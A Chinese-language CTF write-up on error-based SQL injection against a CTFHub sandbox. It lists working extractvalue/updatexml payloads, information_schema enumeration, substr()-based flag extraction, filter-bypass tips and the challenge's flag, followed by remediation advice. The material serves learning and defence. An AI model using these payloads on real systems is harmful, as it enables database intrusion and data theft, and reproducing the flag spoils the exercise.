# CTFHub Writeup - 报错注入

## 题目类型

WEB

0x01 题目信息
项目	内容
题目名称	CTFHub 技能学习 - 报错注入
靶场地址	
http://challenge-65133136674a2faf.sandbox.ctfhub.com:10800
注入参数	GET id
数据库	10.3.22-MariaDB-0+deb10u1
连接用户	root@localhost
目标数据	sqli.flag.flag
Flag	ctfhub{39081c6b74b7d8c9d0e6cdec}
0x02 漏洞原理
「报错注入」是 SQL 注入的一种。它的前提是：页面会把数据库的报错信息原样显示出来。

正常情况下，攻击者即使闭合了 SQL，查询结果也不一定回显到页面上。但如果页面把 You have an error in your SQL syntax ... 这类错误直接打印出来，就可以故意构造一个「必然报错、且错误信息里包含查询结果」的语句，把数据从错误信息里带出来。

本题用的两个经典函数：

extractvalue(xml, xpath)：从 XML 里按 XPath 取值，XPath 写错时会报 XPATH syntax error: '...'；
updatexml(xml, xpath, new)：修改 XML 节点，XPath 写错时同样会报错。
关键点在于：错误信息会把非法的 XPath 字符串回显出来。于是把子查询的结果拼进 XPath，报错信息就会带上查询结果。例如：

sql


and extractvalue(1, concat(0x7e, database()))
0x7e 是波浪号 ~，只用来做分隔符，方便从报错里定位数据。

这两个函数还有一个限制：报错信息最多只显示 32 个字符。flag 往往超过这个长度，所以要用 substr() 分段读取。

0x03 解题过程
3.1 找注入点
首页是一个查询框，GET 传参 id，输入 1 提交后，页面会把执行的 SQL 和结果一起打印出来：

代码块


select * from news where id=1
查询正确
这说明后端是直接把 id 拼进 SQL 的。试着加一个单引号：

代码块


id=1'
代码块


select * from news where id=1'
查询错误: You have an error in your SQL syntax; check the manual ...
near ''' at line 1
报错说明单引号被带进了 SQL，存在注入。注意这里 id 是数字型——不加引号能正常执行，加了引号才报错，所以后续 payload 不需要闭合引号。再用 and 1=1 / and 1=2 验证：

代码块


id=1 and 1=1   -> 查询正确
id=1 and 1=2   -> 查询正确
页面只判断「SQL 是否执行成功」，不区分结果集是否为空，所以布尔条件看不出差异——这正好说明本题要走报错注入，而不是布尔盲注。

3.2 确认报错注入
直接让 extractvalue 报错，把数据库名带出来：

代码块


id=1 and extractvalue(1,concat(0x7e,database()))
页面回显：

代码块


查询错误: XPATH syntax error: '~sqli'
数据库名是 sqli。换成 updatexml 效果一样：

代码块


id=1 and updatexml(1,concat(0x7e,database()),1)
查询错误: XPATH syntax error: '~sqli'
顺手把版本和用户也读出来：

代码块


id=1 and extractvalue(1,concat(0x7e,version()))
-> '~10.3.22-MariaDB-0+deb10u1'

id=1 and extractvalue(1,concat(0x7e,user()))
-> '~root@localhost'
说明数据库是 MariaDB 10.3，且 Web 应用用 root 连库——权限很大，后面查 information_schema 毫无阻力。

3.3 爆表名
有了库名，查 information_schema.tables：

代码块


id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name)
from information_schema.tables where table_schema=database())))
回显：

代码块


XPATH syntax error: '~flag,news'
库 sqli 下有两张表：flag 和 news。目标显然是 flag。

3.4 爆字段名
接着查 information_schema.columns：

代码块


id=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name)
from information_schema.columns where table_schema=database()
and table_name='flag')))
回显：

代码块


XPATH syntax error: '~flag'
表 flag 只有一个字段，名字也叫 flag。

3.5 爆数据
直接查字段值：

代码块


id=1 and extractvalue(1,concat(0x7e,(select flag from flag)))
回显：

代码块


XPATH syntax error: '~ctfhub{39081c6b74b7d8c9d0e6cdec'
可以看到结果在 dec 之后被硬生生截断了——这就是前面说的 32 字符上限（~ 占 1 个，实际只带出 31 个字符）。flag 没取全，不能直接用。

3.6 截断处理
先确认 flag 的真实长度：

代码块


id=1 and extractvalue(1,concat(0x7e,(select length(flag) from flag)))
代码块


XPATH syntax error: '~32'
长度为 32。再用 substr() 从第 31 位开始取：

代码块


id=1 and extractvalue(1,concat(0x7e,(select substr(flag,31,10) from flag)))
代码块


XPATH syntax error: '~c}'
说明第 31 位是 c、第 32 位是 }，flag 到此结束。

为了确认拼接无误，再分段交叉验证一次：

代码块


id=1 and extractvalue(1,concat(0x7e,(select substr(flag,1,20) from flag)))
-> '~ctfhub{39081c6b74b7d'

id=1 and extractvalue(1,concat(0x7e,(select substr(flag,21,12) from flag)))
-> '~8c9d0e6cdec}'

id=1 and updatexml(1,concat(0x7e,(select substr(flag,25,8) from flag)),1)
-> '~0e6cdec}'
两段拼起来：

代码块


ctfhub{39081c6b74b7d + 8c9d0e6cdec} = ctfhub{39081c6b74b7d8c9d0e6cdec}
得到 Flag：

代码块


ctfhub{39081c6b74b7d8c9d0e6cdec}
0x04 完整利用链
代码块


?id=1'                                   → 报错，确认注入
?id=1 and extractvalue(1,concat(0x7e,database()))        → 库名 sqli
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) ...)))  → flag,news
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) ...))) → flag
?id=1 and extractvalue(1,concat(0x7e,(select flag from flag)))  → 前 31 字符
?id=1 and extractvalue(1,concat(0x7e,(select length(flag) from flag))) → 32
?id=1 and extractvalue(1,concat(0x7e,(select substr(flag,31,10) from flag))) → c}
拿到完整 flag。

0x05 踩坑记录
先判断注入类型再动手：and 1=1 和 and 1=2 都显示「查询正确」，说明页面不按结果集区分，布尔盲注走不通，应优先考虑报错注入。
数字型和字符型要分清：本题 id 是数字型，直接 1 and ... 即可；如果照搬 1' and ... 反而会因为多一个引号导致语法错误，payload 全部失效。
0x7e 只是分隔符：它不参与查询，作用是让报错内容形如 ~数据，方便肉眼定位。换成 0x3a（冒号）也可以。
一定注意 32 字符截断：extractvalue 和 updatexml 都只回显 32 个字符，第一次拿到 ctfhub{...dec 很容易误以为 flag 就长这样，实际后面还有内容。规范做法是先 length() 再 substr() 分段拼。
substr 下标从 1 开始：不是从 0 开始，取第 31 位要写 substr(flag,31,10)。
group_concat 也有长度限制：默认 1024 字节，表/字段少的时候够用；数据多时同样要配合 substr 分段。
空格和引号可能被过滤：如果 and 或空格被拦，可以用 /**/、%0a 替代空格，用 0x... 十六进制代替字符串。本题没有过滤，正常写即可。
0x06 修复建议
使用预编译（参数化查询）：PDO 的 prepare/execute 或 mysqli 的预处理，把 id 当参数绑定，从根本上杜绝拼接注入。
对输入做类型校验：id 应该是整数，用 intval() 强制转换或正则限制为纯数字。
关闭详细报错：生产环境设置 display_errors=Off，数据库错误写入日志而不是返回给用户；统一返回「查询失败」。
最小权限：Web 应用不要用 root 连库，只授予业务所需的 SELECT 等权限，禁止访问 information_schema 之外的库。
WAF 兜底：对 extractvalue、updatexml、information_schema、union select 等关键字做拦截，但只能作为补充手段。
统一错误页面：避免把 SQL 语句本身回显到页面（本题把 select * from news where id=... 都打印出来了，等于直接告诉攻击者表名和写法）。
0x07 总结
这道题是报错注入的标准入门流程，记住四步即可：

1.找注入点：加引号看是否报错；
2.确认报错注入：用 extractvalue / updatexml 把 database() 带出来；
3.按库 → 表 → 字段 → 数据逐层查：information_schema 是地图；
4.处理 32 字符限制：length() 看长度，substr() 分段拼接。
原理并不复杂，真正容易翻车的是细节：数字型要不要闭合引号、报错被截断、substr 下标从 1 开始。把这些细节处理好，整条链路就很顺。
